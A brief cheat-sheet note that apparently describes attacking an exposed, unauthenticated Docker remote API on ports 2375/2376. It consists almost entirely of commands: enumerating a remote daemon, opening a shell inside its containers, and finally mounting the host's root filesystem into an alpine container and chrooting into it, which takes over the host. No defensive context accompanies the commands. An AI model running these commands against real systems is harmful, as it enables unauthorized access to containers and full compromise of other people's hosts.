The default port for docker is 2375 (unencrypted) and 2376(encrypted) communication over tcp(although you can choose any other port).

#curl -s http://ip:port/version | jq
#docker -H <host>:<port> info
#docker -H <host>:<port> ps
#docker -H <host>:<port> images
#docker -H <host>:<port> exec -it <container name> /bin/bash
#docker -H <host>:<port> run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh
